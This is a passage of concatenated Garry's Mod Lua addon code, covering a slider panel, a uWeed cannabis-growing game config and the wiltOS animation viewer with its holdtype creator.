		if (!input.IsMouseDown(MOUSE_LEFT)) then
			self:EndDrag()
		end
	end
end

function PANEL:StartDrag()
	self.Dragging = true
	self.OffX = self.Button:CursorPos(MOUSE_LEFT)
end

function PANEL:EndDrag()
	self.Dragging = false
end

function PANEL:OnChange(val)
end

function PANEL:SetValue(val)
	self.Value = val
	self.Button:SetPos(val * (self:GetWide() - 16), 0)
end

function PANEL:GetValue()
	return self.Value
end

vgui.Register('ui_slider', PANEL, 'Panel')
--PATH addons/uweedadvancedcannabisgrowth/lua/uweed/config/sh_config.lua:
UWeed.Pot = {}
UWeed.Light = {}
UWeed.SeedBox = {}
UWeed.WeedBag = {}
-- You will find a large amount of small tweaks you can make here, the growing process is already pretty fine tuned to work well so you most likely won't need to edit the lower part.
-- That being said, every server has diferent needs and wants so we tried to make everything as configurable as possible.
-- Open a ticket for any questions.help
/* ===========================
	GENERAL CONFIGURATION
===========================*/
-- The prefix in chat for the store actions
UWeed.Config.Prefix = "[uWeed]"

-- The color of the prefix in chat for the store actions
UWeed.Config.PrefixColor = Color(0, 200, 0)

-- The font used throughout the addon
UWeed.Config.Font = "Calibri"

-- The NPC model
UWeed.Config.NPCModel = "models/breen.mdl"

-- The min and max price weed sells for per gram (Set them both the same if you want it to be a static value)
UWeed.Config.MinSell = 150
UWeed.Config.MaxSell = 1040

-- When selling the weed, should the user be prompted in chat about their sale?
UWeed.Config.SellChatMessage = true

-- How long should you stay high for after you smoke weed? (seconds)
UWeed.Config.HighTime = 60

-- If you die while high should the effect be removed?
UWeed.Config.ResetHighDeath = true

-- How many tugs do you get per rolled joint? (How many times can 1 rolled joint be smoked?)
UWeed.Config.RollAmount = 3

-- When you die should you lose all the weed on you (all the weed you obtained by picking up rolled joints)
UWeed.Config.KeepWeed = true

-- If above is true, should you spawn with a join if you have some on you?
UWeed.Config.SpawnJoints = true

-- There are 2 sizes for the bud models. Normal or small. Small is more realistic however you may find them too small. This option toggles that (true will use the small models)
UWeed.Config.UseSmallGram = false

/* ===========================
	GROWING CONFIGURATION
===========================*/
-- The timer between each stage of growth
UWeed.Pot.GrowthRate = 10
-- The drop chance for the seed. So it'll be a 1 in x chance of dropping.
UWeed.Pot.SeedDropChance = 15
-- The least amount of buds that can come from a grow
UWeed.Pot.MinBuds = 6
-- The most amount of buds that can come from a grow
UWeed.Pot.MaxBuds = 8
-- When you colkect a bud from the pot, the bud will be between 1 and x grams, what is x? (Setting this to 1 will make it so every bud comes out at base stage of 1g) (Setting this higher than 8 will break it)
UWeed.Pot.MaxBudGram = 3
-- How quickly should light drop? The system works by removing x from itself every second. It starts at 50 and once it hits below 25 it'll prompt the user to give it more light 
UWeed.Pot.LightDeplenishrate = 2

-- So when the light is on the plant how much should it boost the light by each time (roughly every second)? It starts at 50 and once it hits above 75 it'll prompt the user to use less light 
UWeed.Light.IncreaseRate = 5
-- Should the lights require battery?
UWeed.Light.Batery = true
-- If the above is true, how often should the battery decay by 1% (in seconds)
UWeed.Light.BatteryDecay = 1

-- How many seeds can a seedbox hold at 1 time?
UWeed.SeedBox.MaxStorage = 15

-- The max amount of buds that can be stored in 1 bag
UWeed.WeedBag.Capacity = 20
--PATH addons/__main/lua/wos/anim_extension/vgui/wiltos_anim_viewer.lua:
--[[-------------------------------------------------------------------
	wiltOS Animation Viewer:
		A Supplement to the animation base, it allows you to view more than	
					2000 animations/sequences with it's model viewer
			Powered by
						  _ _ _    ___  ____  
				__      _(_) | |_ / _ \/ ___| 
				\ \ /\ / / | | __| | | \___ \ 
				 \ V  V /| | | |_| |_| |___) |
				  \_/\_/ |_|_|\__|\___/|____/ 
											  
 _____         _                 _             _           
|_   _|__  ___| |__  _ __   ___ | | ___   __ _(_) ___  ___ 
  | |/ _ \/ __| '_ \| '_ \ / _ \| |/ _ \ / _` | |/ _ \/ __|
  | |  __/ (__| | | | | | | (_) | | (_) | (_| | |  __/\__ \
  |_|\___|\___|_| |_|_| |_|\___/|_|\___/ \__, |_|\___||___/
                                         |___/             
-------------------------------------------------------------------]]--[[
							  
	Lua Developer: King David
	Contact: http://steamcommunity.com/groups/wiltostech
		
----------------------------------------]]--
wOS = wOS or {}

local w, h = ScrW(), ScrH()

surface.CreateFont( "wOS.Anim.TitleFont", {
	font = "Roboto Cn", -- Use the font-name which is shown to you by your operating system Font Viewer, not the file name
	extended = false,
	size = 24*(h/1200),
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false,
} )

surface.CreateFont( "wOS.Anim.DescFont",{
	font = "Roboto Cn", -- Use the font-name which is shown to you by your operating system Font Viewer, not the file name
	extended = false,
	size = 18*(h/1200),
	weight = 500,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false,
} )

list.Add( "DesktopWindows", {
	icon = "wos/anim_extension/emblem.png",
	title = "wiltOS Viewer",
	init = function() wOS:OpenAnimationMenu() end,
})

function wOS:OpenAnimationMenu()

	if self.OverFrame then 
		self.OverFrame:Remove()
		self.OverFrame = nil
		gui.EnableScreenClicker( false )
		return 
	end

	self.OverFrame = vgui.Create( "DFrame" )
	self.OverFrame:SetSize( w, h )
	self.OverFrame:Center()
	self.OverFrame.Paint = function() end
	self.OverFrame:SetTitle( "" )
	self.OverFrame:ShowCloseButton( false )
	self.OverFrame:SetDraggable( false )
	
	gui.EnableScreenClicker( true )
	self.AnimMenu = vgui.Create( "DFrame", self.OverFrame )
	self.AnimMenu:SetSize( w*0.5, h*0.5 )
	self.AnimMenu:Center()
	self.AnimMenu.Display = LocalPlayer():GetModel()
	self.AnimMenu:MakePopup()
	self.AnimMenu:SetTitle( "" )
	self.AnimMenu:ShowCloseButton( false )
	self.AnimMenu:SetDraggable( false )
	
	local fw, fh = self.AnimMenu:GetSize()
	local padx = fh*0.025
	local pady = padx
	
	local modelmenu = vgui.Create( "DAdjustableModelPanel", self.AnimMenu )
	modelmenu:SetPos( padx, pady )
	modelmenu:SetSize( fw*0.5 - padx - padx*0.5, fh - 2*pady )
	modelmenu.LayoutEntity = function() local ent = modelmenu:GetEntity() ent:SetEyeTarget( modelmenu:GetCamPos() ) ent:FrameAdvance( FrameTime() ) end
	
	self.AnimMenu.Paint = function( pan, ww, hh )
		if not vgui.CursorVisible() then gui.EnableScreenClicker( true ) end
		draw.RoundedBox( 3, 0, 0, ww, hh, Color( 25, 25, 25, 245 ) )
		--draw.SimpleText( "Animation Viewer", "wOS.Anim.TitleFont", ww*0.5, hh*0.05, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )	
		surface.SetDrawColor( Color( 0, 155, 155, 255 ) )
		surface.DrawOutlinedRect( padx, pady, modelmenu:GetWide(), modelmenu:GetTall() )
	end 
		
	local lister = vgui.Create( "DListView", self.AnimMenu )
	lister:SetPos( fw*0.5 + padx*0.5, pady )
	lister:SetSize( fw*0.5 - padx - padx*0.5, fh*0.77 - pady)	
	lister:AddColumn( "Name" )
	lister:SetMultiSelect( false )
	lister:SetHideHeaders( true )
	lister.Pages = {}
	lister.CurrentPage = 1
	
	function lister:Think()
		if wOS.AnimMenu.Display != modelmenu:GetModel() then
			modelmenu:RebuildModel()
		end	
	end
	
	function lister:RebuildCache( ent )
		lister:Clear()
		lister.BasePages = {} // SUPERIOR JACOBS EDIT // https://steamcommunity.com/id/AwesomeJacob/
		lister.Pages = {}
		lister.CurrentPage = 1
		local max = 500
		local count = 0
		local curpage = 1
		for k, v in SortedPairsByValue( ent:GetSequenceList() ) do
			if not lister.BasePages[ curpage ] then lister.BasePages[ curpage ] = {} end
			if count < max then
				table.insert( lister.BasePages[ curpage ], string.lower( v ) )
				if curpage == 1 then
					local line = lister:AddLine( string.lower( v ) )
					line.OnSelect = function()
						ent:ResetSequence( v )
						ent:SetCycle( 0 )
					end
				end
				count = count + 1
			else
				curpage = curpage + 1
				count = 0
			end
		end

		lister.Pages = lister.BasePages
	end

	// SUPERIOR JACOBS EDIT
	// https://steamcommunity.com/id/AwesomeJacob/
	function lister:RebuildToLines( ent, lines )
		lister:Clear()
		lister.Pages = {}
		lister.CurrentPage = 1
		local max = 500
		local count = 0
		local curpage = 1
		for k, v in SortedPairsByValue( lines ) do
			if not lister.Pages[ curpage ] then lister.Pages[ curpage ] = {} end
			if count < max then
				table.insert( lister.Pages[ curpage ], string.lower( v ) )
				if curpage == 1 then
					local line = lister:AddLine( string.lower( v ) )
					line.OnSelect = function()
						ent:ResetSequence( v )
						ent:SetCycle( 0 )
					end
				end
				count = count + 1
			else
				curpage = curpage + 1
				count = 0
			end
		end
	end
	//

	function lister:ChangePage( page )
		lister:Clear()
		if not page then return end	
		if not lister.Pages[ page ] then return end
		local ent = modelmenu:GetEntity()
		for k, v in pairs( lister.Pages[ page ] ) do
			local line = lister:AddLine( string.lower( v ) )
			line.OnSelect = function()
				ent:ResetSequence( v )
				ent:SetCycle( 0 )
			end
		end

		lister:SelectFirstItem()
	end

	function modelmenu:RebuildModel()
		modelmenu:SetModel( wOS.AnimMenu.Display )
		local ent = modelmenu:GetEntity()
		local pos = ent:GetPos()
		local campos = pos + Vector( -150, 0, 0 )
		modelmenu:SetCamPos( campos )
		modelmenu:SetFOV( 45 )
		modelmenu:SetLookAng( ( campos * -1 ):Angle() )
		lister:RebuildCache( modelmenu:GetEntity() )
	end

	local nextbutt = vgui.Create( "DButton", self.AnimMenu )
	nextbutt:SetSize( fw*0.15, fh*0.05 )
	nextbutt:SetPos( fw*0.85 - padx, fh*0.95 - pady*1.5 - nextbutt:GetTall() )
	nextbutt:SetText( "" )
	nextbutt.Paint = function( pan, ww, hh )
		draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		draw.SimpleText( "NEXT PAGE", "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	nextbutt.DoClick = function( pan )
		lister.CurrentPage = math.Clamp( lister.CurrentPage + 1, 1, #lister.Pages )
		lister:ChangePage( lister.CurrentPage )
	end
	
	// SUPERIOR JACOBS EDIT
	// https://steamcommunity.com/id/AwesomeJacob/
	local pagedisplay = vgui.Create( "DLabel", self.AnimMenu )
	pagedisplay:SetSize( fw*0.15, fh*0.05 )
	pagedisplay:SetPos( fw*0.5 + padx*0.5, fh*0.95 - pady*2 - nextbutt:GetTall() - pagedisplay:GetTall() )
	pagedisplay:SetText( "" )
	pagedisplay.Paint = function( pan, ww, hh )
		draw.RoundedBox( 5, 0, 0, ww, hh, Color( 155, 155, 155, 155 ) )
		draw.SimpleText( "PAGE: "..lister.CurrentPage.."/"..#lister.Pages, "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end

	local searchbar = vgui.Create( "DTextEntry", self.AnimMenu )
	searchbar:SetSize( fw*0.15 * 1.5, fh*0.05 * 0.8 )
	searchbar:SetPos( fw*0.85 - padx + fw*0.15 - searchbar:GetWide(), fh*0.95 - pady*2 - nextbutt:GetTall() - fh*0.05*0.5 - searchbar:GetTall()*0.5 )
	searchbar:SetFont("wOS.Anim.DescFont")
	searchbar:SetText( "" )

	local searchtext = vgui.Create( "DButton", self.AnimMenu )
	searchtext:SetSize( fw*0.15 * 0.5, fh*0.05 )
	searchtext:SetPos( fw*0.5 + padx*0.5 + fw*0.15 + padx, fh*0.95 - pady*2 - nextbutt:GetTall() - searchtext:GetTall() )
	searchtext:SetText( "" )
	searchtext.Paint = function( pan, ww, hh )
		draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		draw.SimpleText( "SEARCH", "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	searchtext.DoClick = function( pan )
		local var = string.lower(searchbar:GetValue())
		local page = 1
		local line = 0

		if (var == "") then
			lister.Pages = lister.BasePages
			lister:ChangePage( page )
		else
			local found = {}
									
			for i = 1, #lister.BasePages do
				for _, v in ipairs( lister.BasePages[i] ) do
					if (string.find(v, var)) then
						table.insert(found, v)
					end
				end
			end

			lister:RebuildToLines( modelmenu:GetEntity(), found )
		end
	end
	//

	local prevbutt = vgui.Create( "DButton", self.AnimMenu )
	prevbutt:SetSize( fw*0.15, fh*0.05 )
	prevbutt:SetPos( fw*0.5 + padx*0.5, fh*0.95 - pady*1.5 - prevbutt:GetTall() )
	prevbutt:SetText( "" )
	prevbutt.Paint = function( pan, ww, hh )
		draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		draw.SimpleText( "PREVIOUS PAGE", "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	prevbutt.DoClick = function( pan )
		lister.CurrentPage = math.Clamp( lister.CurrentPage - 1, 1, #lister.Pages )
		lister:ChangePage( lister.CurrentPage )
	end
	
	local replaybutt = vgui.Create( "DButton", self.AnimMenu )
	replaybutt:SetSize( fw*0.15, fh*0.05 )
	replaybutt:SetPos( fw*0.5 + padx*0.5 + replaybutt:GetWide() + padx, fh*0.95 - pady*1.5 - replaybutt:GetTall() )
	replaybutt:SetText( "" )
	replaybutt.Paint = function( pan, ww, hh )
		draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		draw.SimpleText( "REPLAY SELECTION", "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	replaybutt.DoClick = function( pan )
		local selected = lister:GetSelectedLine()
		if not selected then return end
		local ent = modelmenu:GetEntity()
		ent:ResetSequence( lister:GetLines()[ selected ]:GetValue( 1 ) )
		ent:SetCycle( 0 )		
	end
	
	local closebutt = vgui.Create( "DButton", self.AnimMenu )
	closebutt:SetSize( fw*0.3, fh*0.05 )
	closebutt:SetPos( fw*0.5 + fw*0.1, fh*0.95 - pady )
	closebutt:SetText( "" )
	closebutt.Paint = function( pan, ww, hh )
		draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		draw.SimpleText( "CLOSE MENU", "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	closebutt.DoClick = function( pan )
		wOS:OpenAnimationMenu()	
	end
	
	local mw, mh = modelmenu:GetSize()
	
	local infoframe = vgui.Create( "DPanel", modelmenu )
	infoframe:SetSize( mw, mh*0.2 )
	infoframe:SetPos( 0, mh*0.8 )
	infoframe.Paint = function( pan, ww, hh )
		if not lister:GetLines()[ lister:GetSelectedLine() ] then return end
		local title = lister:GetLines()[ lister:GetSelectedLine() ]:GetValue( 1 )
		local ent = modelmenu:GetEntity()
		local act = ent:LookupSequence( title )
		draw.SimpleText( "SEQUENCE: " .. title, "wOS.Anim.DescFont", ww*0.5, hh*0.25, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		if act then
			local actn = ent:GetSequenceActivityName( act )
			act = ent:GetSequenceActivity( act )
			if not act then 
				draw.SimpleText( "ACT ID: NONE", "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			else
				draw.SimpleText( "ACT ID: " .. act, "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end
			if not actn then 
				draw.SimpleText( "ACT NAME: N/A", "wOS.Anim.DescFont", ww*0.5, hh*0.75, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			else
				draw.SimpleText( "ACT NAME: " .. actn, "wOS.Anim.DescFont", ww*0.5, hh*0.75, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end
		end	
	end
	
	local holdframe = vgui.Create( "DFrame", self.OverFrame )
	holdframe:SetSize( fw*0.3, fh*0.1 )
	holdframe:SetPos( fw*1.5 + fw*0.01, fh - fh*0.5 )
	holdframe:SetText( "" )
	holdframe:SetTitle( "" )
	holdframe:ShowCloseButton( false )
	holdframe:SetDraggable( false )
	holdframe.Paint = function( pan, ww, hh )
		draw.RoundedBox( 3, 0, 0, ww, hh, Color( 25, 25, 25, 245 ) )
	end
	holdframe.Think = function( pan )
		local endy = fh*0.1
		if pan.Expand then
			endy = fh
		end
		pan:SetTall( math.Approach( pan:GetTall(), endy, 15 ) )
	end
	holdframe.Expand = false
	holdframe:MakePopup()
	
	local iw, ih = holdframe:GetSize()
	
	local togglebutt = vgui.Create( "DButton", holdframe )
	togglebutt:SetSize( iw*0.9, fh*0.05 )
	togglebutt:SetPos( iw*0.05, ih - fh*0.075 )
	togglebutt:SetText( "" )
	togglebutt.Paint = function( pan, ww, hh )
		draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		draw.SimpleText( ( holdframe.Expand and "Close Holdtype Creator" ) or "Open Holdtype Creator", "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	
	local ACTS = { 
		[ "Idle Standing" ] = "ACT_MP_STAND_IDLE", 
		[ "Slow Walk" ] = "ACT_MP_WALK", 
		[ "Running" ] = "ACT_MP_RUN", 
		[ "Sprinting" ] = "ACT_MP_SPRINT",
		[ "Idle Crouching" ] = "ACT_MP_CROUCH_IDLE", 
		[ "Walk Crouching" ] = "ACT_MP_CROUCHWALK", 
		[ "Attack Standing" ] = "ACT_MP_ATTACK_STAND_PRIMARYFIRE",
		[ "Attack Crouching" ] = "ACT_MP_ATTACK_CROUCH_PRIMARYFIRE",
		[ "Reload Standing" ] = "ACT_MP_RELOAD_STAND",
		[ "Reload Crouching" ] = "ACT_MP_RELOAD_CROUCH",
		[ "Swimming" ] = "ACT_MP_SWIM",
		[ "Jumping" ] = "ACT_MP_JUMP",
		[ "Landing" ] = "ACT_LAND",
	}
	
	local title = vgui.Create( "DLabel", holdframe )
	title:SetSize( iw*0.8, fh*0.05 )
	title:SetPos( iw*0.05, ih )
	title:SetText( "Base Holdtype:" )
	title:SetFont( "wOS.Anim.TitleFont" )
	
	local basetype = vgui.Create( "DTextEntry", holdframe )
	basetype:SetSize( iw*0.8, fh*0.03 )
	basetype:SetPos( iw*0.05, ih + fh*0.05 )
	
	local baselist = vgui.Create( "DImageButton", holdframe )
	baselist:SetSize( fh*0.03, fh*0.03 )
	baselist:SetPos( iw*0.86, ih + fh*0.05 )
	baselist:SetImage( "icon16/application_view_list.png" )	
	baselist.DoClick = function( pan )
		if pan.ItemIconOptions then pan.ItemIconOptions:Remove() pan.ItemIconOptions = nil end
		pan.ItemIconOptions = DermaMenu( baselist )
		pan.ItemIconOptions:MakePopup()
		pan.ItemIconOptions:SetPos( gui.MouseX(), gui.MouseY() )
		pan.ItemIconOptions.Think = function( self )
			if not pan then self:Remove() end
		end
		local holdlist = { "pistol", "smg", "grenade", "ar2", "shotgun", "rpg", "physgun", "crossbow", "melee", "slam", "normal", "fist", "melee2", "passive", "knife", "duel", "camera", "magic", "revolver" }
		for name, _ in pairs( wOS.AnimExtension.TranslateHoldType ) do
			table.insert( holdlist, name )
		end
		for _, typ in ipairs( holdlist ) do
			pan.ItemIconOptions:AddOption( typ, function( self ) 
				basetype:SetText( typ )
				self:Remove()
			end )
		end			
	end
	
	local title = vgui.Create( "DLabel", holdframe )
	title:SetSize( iw*0.9, fh*0.05 )
	title:SetPos( iw*0.05, ih + fh*0.09 )
	title:SetText( "Holdtype Name:" )
	title:SetFont( "wOS.Anim.TitleFont" )
	
	local nametext = vgui.Create( "DTextEntry", holdframe )
	nametext:SetSize( iw*0.9, fh*0.03 )
	nametext:SetPos( iw*0.05, ih + fh*0.15 )
	
	local title = vgui.Create( "DLabel", holdframe )
	title:SetSize( iw*0.9, fh*0.05 )
	title:SetPos( iw*0.05, ih + fh*0.19 )
	title:SetText( "Holdtype Code:" )
	title:SetFont( "wOS.Anim.TitleFont" )
	
	local prefix = vgui.Create( "DTextEntry", holdframe )
	prefix:SetSize( iw*0.9, fh*0.03 )
	prefix:SetPos( iw*0.05, ih + fh*0.25 )
	prefix:SetText( "wos-custom-xxx" )
	
	local title2 = vgui.Create( "DLabel", holdframe )
	title2:SetSize( iw*0.9, fh*0.05 )
	title2:SetPos( iw*0.05, ih + fh*0.29 )
	title2:SetText( "Current Action:" )
	title2:SetFont( "wOS.Anim.TitleFont" )
	
	local DComboBox = vgui.Create( "DComboBox", holdframe )
	DComboBox:SetSize( iw*0.9, fh*0.03 )
	DComboBox:SetPos( iw*0.05, ih + fh*0.35 )
	DComboBox:SetValue( "Idle Standing" )
	for act, _ in pairs( ACTS ) do
		DComboBox:AddChoice( act )
	end
	
	local AddSeq = vgui.Create( "DButton", holdframe )
	AddSeq:SetSize( iw*0.9, fh*0.05 )
	AddSeq:SetPos( iw*0.05, fh*0.515 )
	AddSeq:SetText( "" )
	AddSeq.Paint = function( pan, ww, hh )
		draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		draw.SimpleText( "Add Selected Sequence", "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	
	local AppList = vgui.Create( "DListView", holdframe )
	AppList:SetSize( iw*0.9, fh*0.3 )
	AppList:SetPos( iw*0.05, fh*0.6 )
	AppList:SetMultiSelect( false )
	AppList:AddColumn( "Animation" )
	AppList:AddColumn( "Weight" )
	AppList.OnRowRightClick = function( pan, id, line )
		if pan.ItemIconOptions then pan.ItemIconOptions:Remove() pan.ItemIconOptions = nil end
		pan.ItemIconOptions = DermaMenu( AppList )
		pan.ItemIconOptions:MakePopup()
		pan.ItemIconOptions:SetPos( gui.MouseX(), gui.MouseY() )
		pan.ItemIconOptions.Think = function( self )
			if not pan then self:Remove() end
		end
		pan.ItemIconOptions:AddOption( "Change Weight", function( self ) 

			local Scratch = vgui.Create( "DNumberScratch", holdframe:GetParent() )
			Scratch:SetSize( 1, 1 )
			Scratch:Center()
			Scratch:MakePopup()
			Scratch:SetValue( pan.Selections[ pan.ActSelect ][ line:GetValue( 1 ) ]*100 or 100 )
			Scratch:SetMin( 0 )
			Scratch:SetMax( 100 )
			Scratch.OnMousePressed = function() end
			Scratch.OnMouseReleased = function() end
			Scratch.OnValueChanged = function( panz )
				pan.Selections[ pan.ActSelect ][ line:GetValue( 1 ) ] = math.Round( panz:GetFloatValue() )/100
			end
			Scratch.Think = function( panz )
				if input.IsMouseDown( MOUSE_LEFT ) or input.IsMouseDown( MOUSE_RIGHT ) then
					panz:Remove()
					AppList:ReloadAll()
					return
				end
				panz:SetActive( true )
				panz:MouseCapture( true )
				panz:LockCursor()
				if ( !system.IsLinux() ) then
					panz:SetCursor( "none" )
				end
				panz:SetShouldDrawScreen( true )
			end
			hook.Add( "DrawOverlay", "wOS.AnimExtension.ReallyFuckedUpWorkAround", function()
				if ( !IsValid( Scratch ) ) then hook.Remove( "DrawOverlay", "wOS.AnimExtension.ReallyFuckedUpWorkAround" ) return end
				Scratch:PaintScratchWindow()
			end )
			self:Remove()
		end )	
		pan.ItemIconOptions:AddOption( "Remove", function( self ) 
			pan.Selections[ pan.ActSelect ][ line:GetValue( 1 ) ] = nil
			pan:RemoveLine( id )
			self:Remove()
		end )	
	end
	AppList.Selections = {}
	AppList.ActSelect = DComboBox:GetValue()
	AppList.ReloadAll = function( pan ) 
		pan:Clear()
		if pan.Selections[ pan.ActSelect ] then
			for sequence, weight in pairs( pan.Selections[ pan.ActSelect ] ) do
				pan:AddLine( sequence, weight * 100 .. "%" )
			end
		end
	end
	AppList:ReloadAll()
	
	AddSeq.DoClick = function( pan )
		local l = lister:GetSelected()[1]
		if l then
			AppList:AddLine( l:GetValue(1), "100%" )
			if not AppList.Selections[ AppList.ActSelect ] then
				AppList.Selections[ AppList.ActSelect ] = {}
			end
			AppList.Selections[ AppList.ActSelect ][ l:GetValue(1) ] = 1
		end
	end
	
	DComboBox.OnSelect = function( panel, index, value )
		AppList.ActSelect = value
		AppList:ReloadAll()
	end
	
	togglebutt.DoClick = function( pan )
		holdframe.Expand = !holdframe.Expand
		if !holdframe.Expand then
			basetype:SetText( "" )
			nametext:SetText( "" )
			prefix:SetText( "wos-custom-xxx" )
			DComboBox:SetValue( "Idle Standing" )
			AppList.ActSelect = "Idle Standing"
			AppList.Selections = {}
			AppList:ReloadAll()
		end
	end
	
	local CreateHoldType = vgui.Create( "DButton", holdframe )
	CreateHoldType:SetSize( iw*0.9, fh*0.05 )
	CreateHoldType:SetPos( iw*0.05, fh*0.925 )
	CreateHoldType:SetText( "" )
	CreateHoldType.Paint = function( pan, ww, hh )
		draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		draw.SimpleText( "Print Holdtype ( Console )", "wOS.Anim.DescFont", ww*0.5, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end
	CreateHoldType.DoClick = function( pan )
		chat.AddText( color_white, "[", Color( 0, 175, 255 ), "wOS", color_white, "] The Holdtype code has been printed into console!" )
		local name = ( nametext:GetText():len() > 0 and nametext:GetText() ) or "Rename Me" 
		local pref = ( prefix:GetText():len() > 0 and prefix:GetText() ) or "wos-custom-xxx" 
		local base = ( basetype:GetText():len() > 0 and basetype:GetText() ) or "normal"
		print( [[--=====================================================================]] )
		print( [[/*		My Custom Holdtype
			Created by ]] .. LocalPlayer():Nick() .. [[( ]] .. LocalPlayer():SteamID() .. [[ )*/]])
		print( [[
local DATA = {}
DATA.Name = "]] .. name .. [["
DATA.HoldType = "]] .. pref .. [["
DATA.BaseHoldType = "]] .. base .. [["
DATA.Translations = {} 
]])
		for slot, data in pairs( AppList.Selections ) do
			if table.Count( data ) > 0 then
				print( [[DATA.Translations[ ]] .. ACTS[slot] .. [[ ] = {]] )
				for seq, weight in pairs( data ) do
					print( [[	{ Sequence = "]] .. seq .. [[", Weight = ]] .. weight .. [[ },]])
				end
				print( [[}]] )
				print( "" )
			end
		end
		print( [[wOS.AnimExtension:RegisterHoldtype( DATA )]] )
		print( [[--=====================================================================]] )
	end
	
end
--PATH addons/__main/lua/wos/anim_extension/core/sh_metatable.lua:
--[[-------------------------------------------------------------------
	wiltOS Hold Type Meta Tables:
		Creating functions for your Hold Types since 2017
			Powered by
						  _ _ _    ___  ____  
				__      _(_) | |_ / _ \/ ___| 
				\ \ /\ / / | | __| | | \___ \ 
				 \ V  V /| | | |_| |_| |___) |
				  \_/\_/ |_|_|\__|\___/|____/ 
											  
 _____         _                 _             _           
|_   _|__  ___| |__  _ __   ___ | | ___   __ _(_) ___  ___ 
  | |/ _ \/ __| '_ \| '_ \ / _ \| |/ _ \ / _` | |/ _ \/ __|
  | |  __/ (__| | | | | | | (_) | | (_) | (_| | |  __/\__ \
  |_|\___|\___|_| |_|_| |_|\___/|_|\___/ \__, |_|\___||___/
                                         |___/             
-------------------------------------------------------------------]]--[[
							  
	Lua Developer: King David
	Contact: http://steamcommunity.com/groups/wiltostech
		
----------------------------------------]]--

wOS = wOS or {}
wOS.AnimExtension.HoldTypeMeta = wOS.AnimExtension.HoldTypeMeta or {}

local HOLDTYPE = {}

HOLDTYPE.GetName = function( self ) 
	return self.Name or nil
end

HOLDTYPE.GetID = function( self )
	return self.HoldType or "wos-custom"
end

HOLDTYPE.GetActivityList = function( self )
	local index = wOS.AnimExtension.ActIndex[ self:GetBaseHoldType() ]
	return {
		[ACT_MP_STAND_IDLE] 				= index,
	    [ACT_MP_WALK] 						= index+1,
		[ACT_MP_RUN] 						= index+2,
		[ACT_MP_CROUCH_IDLE] 				= index+3,
		[ACT_MP_CROUCHWALK] 				= index+4,
		[ACT_MP_ATTACK_STAND_PRIMARYFIRE] 	= index+5,
		[ACT_MP_ATTACK_CROUCH_PRIMARYFIRE] = index+5,
		[ACT_MP_RELOAD_STAND]		 		= index+6,
		[ACT_MP_RELOAD_CROUCH]		 		= index+6,
		[ACT_MP_JUMP] 						= index+7,
		[ACT_RANGE_ATTACK1] 				= index+8,
		[ACT_MP_SWIM] 						= index+9,	
	}
end

HOLDTYPE.GetBaseHoldType = function( self )
	return self.BaseHoldType or "normal"
end

HOLDTYPE.SetBaseHoldType = function( self, newtype )
	self.BaseHoldType = newtype
end

//This is a god damn mess mostly because of legacy support, I need to redo this part for sure.
//OR at least make the old hold-types switch over to the new one
HOLDTYPE.GetActData = function( self, act ) 

	local base = self.Translations[ act ]
	local tbl
	
	if base then
		tbl = {}
		if istable( base ) then
			if base.Sequence then
				tbl.Sequence = base.Sequence
				tbl.Weight = base.Weight or 1
			else
				local seed = ( game.SinglePlayer() and math.random( 1, #base ) ) or util.SharedRandom( "wOS.AnimExtension." .. self:GetName() .. "[" .. act .. "]", 1, #base )
				local key = math.Round( seed )
				local innerbase = base[key]
				if istable( innerbase ) then
					tbl = innerbase
				elseif isstring( innerbase ) then
					tbl.Sequence = innerbase
